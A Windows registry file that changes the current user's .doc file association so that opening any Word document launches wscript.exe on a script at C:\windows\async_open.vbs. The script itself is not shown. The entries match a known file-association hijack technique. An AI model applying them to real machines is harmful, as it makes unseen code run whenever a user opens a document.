Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\.doc]
@="Word.Document.8"

[HKEY_CURRENT_USER\Software\Classes\Word.Document.8\shell\open\command]
@="C:\\windows\\system32\\wscript.exe \"C:\\windows\\async_open.vbs\" \"%1\""

